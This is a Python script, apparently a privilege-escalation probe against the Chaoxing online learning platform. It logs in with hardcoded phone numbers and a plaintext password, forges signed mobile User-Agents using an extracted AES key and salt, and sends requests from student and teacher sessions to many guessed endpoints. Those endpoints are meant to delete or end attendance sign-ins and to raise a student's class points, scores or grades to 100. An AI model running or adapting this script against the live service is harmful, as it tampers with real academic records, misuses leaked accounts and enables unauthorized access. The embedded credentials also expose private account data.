import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in str(detail).lower() for kw in ["success", "删除成功", "修改成功"]) or '"status":1' in str(evidence)
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"课堂积分修改 & 删除签到活动漏洞深入探索")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    # 获取活动列表
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    test_aid = str(active_list[0].get("id", "")) if active_list else "5000163776554"
    print(f"  测试活动ID: {test_aid}")

    # ========== 深入探索：/newsign/ 路径下的删除/结束端点 ==========
    print("\n" + "=" * 80)
    print("[A] /newsign/ 路径删除/结束端点深入测试")
    print("=" * 80)

    # 上一轮发现/pptSign/endSign教师返回{"status":1}，学生返回"无权限"
    # 关键问题：/newsign/endSign是否像updateSignStatus一样缺少权限校验？

    newsign_manage_apis = [
        # 删除类
        ("/newsign/deleteSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/deleteActive", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/delSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/delActive", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/removeSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/cancelSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        # 结束类
        ("/newsign/endSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/stopSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/endActive", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/stopActive", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/finishSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/newsign/closeSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
    ]

    for path, data in newsign_manage_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            uid_val = puid_s if label == "学生" else puid_t
            data_copy = dict(data)
            data_copy["uid"] = uid_val
            try:
                r = session.post(f"{base}{path}", data=data_copy,
                                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=15, allow_redirects=False)
                short = path.split("/")[-1][:25]
                if r.status_code != 404:
                    rec(f"A-newsign-{short}-{label}",
                        f"{label} POST {path}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== 深入探索：课堂积分API ==========
    print("\n" + "=" * 80)
    print("[B] 课堂积分API深入探索")
    print("=" * 80)

    # B.1 通过课程页面获取积分信息
    print("\n--- B.1 课程页面积分信息 ---")
    course_pages = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stuCourseList?view=json&m=0",
    ]

    for url in course_pages:
        try:
            r = s_s.get(url, timeout=20)
            d = safe_json(r)
            if isinstance(d, dict):
                # 查找积分相关字段
                credit_fields = {k: v for k, v in d.items() if any(kw in k.lower() for kw in ["credit", "score", "point", "积分"])}
                if credit_fields:
                    print(f"  {url[:60]}: credit_fields={credit_fields}")
                    rec("B1-credit-fields", f"积分字段: {credit_fields}", str(credit_fields)[:300])

                # 在课程列表中查找积分
                if "channelList" in d:
                    for ch in d["channelList"]:
                        if isinstance(ch, dict):
                            for k, v in ch.items():
                                if any(kw in str(k).lower() for kw in ["credit", "score", "point"]):
                                    print(f"    channelList.{k}={v}")
                if "courseList" in d:
                    for c in d["courseList"][:3]:
                        if isinstance(c, dict):
                            credit_keys = {k: v for k, v in c.items() if any(kw in str(k).lower() for kw in ["credit", "score", "point"])}
                            if credit_keys:
                                print(f"    courseList credit: {credit_keys}")
        except Exception as e:
            pass

    # B.2 积分相关API（mooc-ans路径）
    print("\n--- B.2 mooc-ans积分API ---")
    mooc_credit_apis = [
        # 课堂积分/互动分
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/getClassPoint", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/getPoint", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/credit/getCredit", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/credit/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/score/getScore", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/score/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/point/getPoint", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/point/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        # 互动/表现分
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/interaction/getInteraction", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/interaction/score", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/interaction/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        # 经验值
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/experience/getExperience", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/experience/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        # 课堂表现
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classbehavior/getClassBehavior", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classbehavior/score", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        # 课堂成绩
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classgrade/getClassGrade", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
        ("GET", "https://mooc1-api.chaoxing.com/mooc-ans/classgrade/list", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID}),
    ]

    for method, url, params in mooc_credit_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                params_copy = dict(params)
                params_copy["uid"] = puid_s if label == "学生" else puid_t
                r = session.get(url, params=params_copy, timeout=15)
                if r.status_code != 404 and len(r.text) > 5 and "404" not in r.text[:100]:
                    short = url.replace("https://mooc1-api.chaoxing.com/mooc-ans/", "")[:35]
                    rec(f"B2-mooc-{short}-{label}",
                        f"{label} GET {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # B.3 积分修改API（POST）
    print("\n--- B.3 积分修改API ---")
    credit_modify_apis = [
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/updateClassPoint",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "point": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/addClassPoint",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "point": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classpoint/modifyClassPoint",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "point": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/credit/updateCredit",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "credit": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/credit/addCredit",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "credit": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/score/updateScore",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/score/addScore",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/point/updatePoint",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "point": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/point/addPoint",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "point": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/interaction/updateInteraction",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/experience/updateExperience",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "experience": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/experience/addExperience",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "experience": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classbehavior/updateClassBehavior",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "score": "100", "value": "100"}),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/classgrade/updateClassGrade",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": STUDENT_PUID, "grade": "100", "value": "100"}),
    ]

    for method, url, data in credit_modify_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                data_copy = dict(data)
                data_copy["uid"] = puid_s if label == "学生" else puid_t
                r = session.post(url, data=data_copy,
                                 headers={"Referer": "https://mooc1-api.chaoxing.com/",
                                          "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=15)
                if r.status_code != 404 and len(r.text) > 5 and "404" not in r.text[:100]:
                    short = url.replace("https://mooc1-api.chaoxing.com/mooc-ans/", "")[:35]
                    rec(f"B3-modify-{short}-{label}",
                        f"{label} POST {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # B.4 搜索课程积分页面
    print("\n--- B.4 课程积分页面搜索 ---")
    score_pages = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/scorelist?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/studyscore?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/creditlist?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/studyprocess/getStudyProcess?courseId={COURSE_ID}&clazzId={CLASS_ID}&uid={STUDENT_PUID}",
    ]

    for url in score_pages:
        for session, label in [(s_s, "学生")]:
            try:
                r = session.get(url, timeout=15)
                if r.status_code == 200 and len(r.text) > 10:
                    short = url.split("?")[0].replace("https://mooc1-api.chaoxing.com/mooc-ans/", "")[:30]
                    rec(f"B4-page-{short}", f"学生GET {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== 深入探索：/pptSign/ 已知端点 ==========
    print("\n" + "=" * 80)
    print("[C] /pptSign/ 已知端点权限测试")
    print("=" * 80)

    # 已知/pptSign/endSign教师可成功，测试其他管理端点
    pptsign_manage = [
        ("/pptSign/endSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/pptSign/deleteSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/pptSign/cancelSign", {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID}),
        ("/pptSign/startSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s, "signType": "0"}),
        ("/pptSign/createSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s, "signType": "0"}),
    ]

    for path, data in pptsign_manage:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                data_copy = dict(data)
                data_copy["uid"] = puid_s if label == "学生" else puid_t
                r = session.post(f"{base}{path}", data=data_copy,
                                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=15, allow_redirects=False)
                short = path.split("/")[-1][:25]
                rec(f"C-pptSign-{short}-{label}",
                    f"{label} POST {path}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== 保存结果 ==========
    print("\n" + "=" * 80)
    print("[保存结果]")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "credit_delete_deep_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    # 汇总关键发现
    print("\n  关键发现:")
    for r_item in results:
        if "success" in str(r_item.get("detail", "")).lower() or "success" in str(r_item.get("evidence", "")).lower():
            print(f"    🔴 {r_item['tag']}: {r_item['detail'][:120]}")
        elif '"status":1' in str(r_item.get("evidence", "")):
            print(f"    🔴 {r_item['tag']}: {r_item['detail'][:120]}")
        elif "无权限" not in str(r_item.get("detail", "")) and "404" not in str(r_item.get("detail", "")) and "500" not in str(r_item.get("detail", "")):
            print(f"    ⚡ {r_item['tag']}: {r_item['detail'][:120]}")

if __name__ == "__main__":
    run()
